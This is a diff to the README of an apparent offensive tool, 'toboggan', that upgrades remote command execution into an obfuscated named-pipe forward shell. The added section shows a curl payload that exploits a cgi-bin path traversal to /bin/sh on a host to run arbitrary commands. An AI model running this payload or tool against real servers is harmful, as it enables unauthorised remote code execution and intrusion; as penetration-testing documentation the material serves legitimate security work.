@@ -36,6 +36,13 @@ toboggan -m ~/phpexploit.py --camouflage --fifo --os "unix" -wd /dev/shm/apache-
 
 It will start a FiFo named-pipe (a.k.a `mkfifo` shell, forward-shell) on `unix` (`--os`) remote system and obfuscating all commands using the [hide.py](./toboggan/actions/hide/unix.py) actions.
 
+### Wrap a shell command
+
+If you are really lazy, you can directly wrap a shell command:
+```shell
+toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
+```
+
 ### Proxy
 
 You can forward to your favorite proxifier such as your favorite [`Squid`](https://www.squid-cache.org/) server using the `--proxy` parameter:
